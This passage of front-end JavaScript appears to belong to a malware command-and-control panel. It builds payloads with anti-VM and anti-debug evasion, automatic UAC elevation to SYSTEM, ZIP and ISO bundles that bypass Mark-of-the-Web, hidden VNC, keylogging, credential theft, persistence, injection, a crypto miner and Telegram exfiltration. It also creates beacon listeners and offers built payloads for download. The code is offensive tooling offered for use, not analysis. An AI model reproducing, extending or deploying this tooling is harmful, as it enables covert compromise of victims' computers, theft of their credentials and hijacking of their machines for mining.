              <label class="switch"><input type="checkbox" id="b-hdr" /><span class="track"></span>Header-carry C2</label>
              <label class="switch"><input type="checkbox" id="b-antivm" checked /><span class="track"></span>Anti-VM</label>
              <label class="switch"><input type="checkbox" id="b-antidbg" checked /><span class="track"></span>Anti-debug</label>
              <label class="switch"><input type="checkbox" id="b-autoesc" checked /><span class="track"></span>Auto UAC→SYSTEM</label>
            </div>
            <div class="form-grid">
              <label class="field2"><span>Silent bundle</span>
                <select id="b-bundle"><option value="">none (raw .py)</option><option value="zip">ZIP (hidden VBS launcher)</option><option value="iso">ISO (MOTW-bypass container)</option></select></label>
              <label class="field2"><span>Modules (csv or "all")</span><input id="b-modules" value="all" placeholder="esc,uac,runas,hvnc,keylog,creds,persist,exec,inject,net,proc,anti,ws" /></label>
              <label class="field2"><span>Decoy URLs (csv, optional)</span><input id="b-decoys" placeholder="https://www.bing.com,https://office.com" /></label>
              <label class="field2"><span>Kill date (YYYY-MM-DD, optional)</span><input id="b-killdate" placeholder="2027-01-01" /></label>
              <label class="field2"><span>Telegram bot token (transport=telegram)</span><input id="b-tgtoken" placeholder="123456:ABC-DEF…" /></label>
              <label class="field2"><span>Telegram chat id</span><input id="b-tgchat" placeholder="-100…" /></label>
            </div>
          </div>
        </div>
        <hr class="sep"/>
        <button class="btn primary block" id="build-btn" onclick="buildPayload()">${icon('builder', 15)} Build payload</button>
        <div id="b-result" style="margin-top:15px"></div>
      </div>
      <div class="card flush">
        <div style="padding:18px 18px 6px"><h3 style="margin:0">Built payloads</h3></div>
        <div id="payload-list"><div style="padding:18px"><div class="skel skel-row"></div><div class="skel skel-row"></div></div></div>
      </div>
    </div>`;
  loadPayloads();
}
async function loadPayloads() {
  try {
    const list = await api('/payloads'); state.payloads = list;
    const el = $('#payload-list'); if (!el) return;
    if (!list.length) { el.innerHTML = `<div class="empty">${icon('builder', 26)}<span>No payloads built yet.</span></div>`; return; }
    el.innerHTML = `<div class="table-wrap"><table><thead><tr><th>Name</th><th>Type</th><th>Size</th><th></th></tr></thead><tbody>
      ${list.map((p) => `<tr>
        <td><strong>${esc(p.name)}</strong><div class="mono muted" style="font-size:11px">${esc(p.filename || '')}</div></td>
        <td><span class="tag neutral">${esc(p.agent_type)}/${esc(p.os_target)}</span><div class="muted" style="font-size:11px;margin-top:3px">${esc(p.transport)}</div></td>
        <td class="muted">${bytes(p.size)}</td>
        <td style="text-align:right"><a class="btn sm" href="${API}/payloads/${p.id}/download?token=${encodeURIComponent(state.token)}">Download</a></td>
      </tr>`).join('')}</tbody></table></div>`;
  } catch (_) {}
}
async function buildPayload() {
  const btn = $('#build-btn'); if (btn) { btn.classList.add('loading'); btn.disabled = true; }
  const body = {
    name: $('#b-name').value || undefined, agent_type: $('#b-agent').value, os_target: $('#b-os').value,
    transport: $('#b-transport').value, host: $('#b-host').value || undefined,
    port: $('#b-port').value ? Number($('#b-port').value) : undefined,
    beacon_interval: Number($('#b-interval').value || 5), jitter: Number($('#b-jitter').value || 0.2),
    obfuscate: $('#b-obf').checked, enhanced: $('#b-enh').checked, persist: $('#b-persist').checked,
    keylog: $('#b-keylog').checked, miner: $('#b-miner').checked,
    miner_pool: $('#b-pool').value || undefined, miner_wallet: $('#b-wallet').value || undefined,
    header_carry: $('#b-hdr').checked, anti_vm: $('#b-antivm').checked, anti_debug: $('#b-antidbg').checked,
    auto_elevate: $('#b-autoesc').checked,
    bundle: $('#b-bundle').value || undefined,
    modules: $('#b-modules').value || 'all',
    decoys: $('#b-decoys').value || undefined,
    killdate: $('#b-killdate').value || undefined,
    tg_bot_token: $('#b-tgtoken').value || undefined,
    tg_chat: $('#b-tgchat').value || undefined,
  };
  const out = $('#b-result'); out.innerHTML = '<span class="muted">Building…</span>';
  try {
    const r = await api('/builders/build', { method: 'POST', body: JSON.stringify(body) });
    out.innerHTML = `<div class="card" style="border-color:rgba(52,211,153,0.3);background:rgba(52,211,153,0.05)">
      <div class="ok row" style="gap:8px">${icon('check', 15)} Built <strong>${esc(r.name)}</strong></div>
      <div class="kv" style="margin-top:12px">
        <div class="k">Session ID</div><div class="v mono">${esc(r.session_id || '—')}</div>
        <div class="k">Size</div><div class="v">${bytes(r.size)}</div>
        <div class="k">SHA256</div><div class="v mono" style="font-size:10.5px">${esc(r.sha256 || '—')}</div>
        <div class="k">Obfuscated</div><div class="v">${r.obfuscated ? 'yes' : 'no'}</div>
      </div>
      ${r.path ? `<a class="btn primary block" style="margin-top:14px" href="${API}/payloads/${r.id}/download?token=${encodeURIComponent(state.token)}">Download ${esc(r.filename)}</a>` : ''}
      ${r.note ? `<div class="muted" style="margin-top:10px;font-size:12px">${esc(r.note)}</div>` : ''}
    </div>`;
    toast('payload built'); loadPayloads();
  } catch (ex) { out.innerHTML = `<span class="error">${esc(ex.message)}</span>`; toast(ex.message, true); }
  finally { if (btn) { btn.classList.remove('loading'); btn.disabled = false; } }
}
window.buildPayload = buildPayload;

async function renderListeners() {
  let list = [];
  try { list = await api('/listeners'); } catch (_) {}
  $('#page').innerHTML = `
    <div class="grid cols-2">
      <div class="card">
        <h3>Create listener</h3>
        <div class="form-grid">
          <label class="field2"><span>Name</span><input id="l-name" placeholder="prod-https" /></label>
          <label class="field2"><span>Transport</span>
            <select id="l-transport"><option>https</option><option>doh</option><option>ws</option><option>tcp</option></select></label>
          <label class="field2"><span>Host</span><input id="l-host" placeholder="0.0.0.0" /></label>
          <label class="field2"><span>Port</span><input id="l-port" type="number" placeholder="8443" /></label>
          <label class="field2 full"><span>Path</span><input id="l-path" placeholder="/api/beacon" /></label>
        </div>
        <hr class="sep"/>
        <button class="btn primary block" onclick="createListener()">${icon('listeners', 15)} Create listener</button>
      </div>
      <div class="card flush">
        <div style="padding:18px 18px 6px"><h3 style="margin:0">Listeners</h3></div>
        ${list.length ? `<div class="table-wrap"><table><thead><tr><th>Name</th><th>Transport</th><th>Endpoint</th><th></th></tr></thead><tbody>
          ${list.map((l) => `<tr>
            <td><strong>${esc(l.name)}</strong></td>
            <td><span class="tag neutral">${esc(l.transport)}</span></td>
            <td class="mono muted">${esc(l.host || '—')}:${esc(l.port || '')}${esc(l.path || '')}</td>
            <td style="text-align:right"><button class="btn sm danger" onclick="delListener('${l.id}')">Delete</button></td>
          </tr>`).join('')}</tbody></table></div>`
        : `<div class="empty">${icon('listeners', 26)}<span>No listeners.</span></div>`}
      </div>
    </div>`;
}
window.createListener = async () => {
  try {
    await api('/listeners', { method: 'POST', body: JSON.stringify({
      name: $('#l-name').value, transport: $('#l-transport').value, host: $('#l-host').value,
      port: $('#l-port').value ? Number($('#l-port').value) : undefined, path: $('#l-path').value,
    }) });
    toast('listener created'); renderListeners();
  } catch (ex) { toast(ex.message, true); }
};
window.delListener = async (id) => {
  if (!(await confirmModal('Delete listener', 'Remove this listener endpoint?', 'Delete'))) return;
  try { await api(`/listeners/${id}`, { method: 'DELETE' }); renderListeners(); } catch (ex) { toast(ex.message, true); }
};

async function renderEvents() {
  let list = [];
  try { list = await api('/events?limit=200'); } catch (_) {}
  const lvl = (l) => l === 'error' ? 'dead' : l === 'warn' ? 'neutral' : 'active';
  $('#page').innerHTML = `
    <div class="card flush">
      ${list.length ? `<div class="table-wrap"><table><thead><tr><th>Time</th><th>Level</th><th>Category</th><th>Message</th></tr></thead><tbody>
        ${list.map((e) => `<tr>
          <td class="muted" style="white-space:nowrap">${fmtTime(e.created_at)}</td>
          <td><span class="tag ${lvl(e.level)}">${esc(e.level)}</span></td>
          <td class="mono muted">${esc(e.category)}</td>
          <td>${esc(e.message)}</td>
        </tr>`).join('')}</tbody></table></div>`
      : `<div class="empty">${icon('events', 26)}<span>No events recorded.</span></div>`}
    </div>`;
}

/* ── boot ─────────────────────────────────────────────────────────── */
async function boot() {
  try {
    const me = await api('/auth/me');
    state.user = me.user;
    const uc = $('#user-card');
    if (uc) uc.innerHTML = `<span class="avatar">${esc(initials(state.user.username))}</span>
      <span class="user-meta"><strong>${esc(state.user.username)}</strong><span>${esc(state.user.role)}</span></span>`;
    showApp();
    buildNav();
    connectWs();
    await refreshSessions();
    navigate();
  } catch (_) { logout(); }
}
(async function init() {
  if (!state.token) { showLogin(); return; }
  await boot();
})();
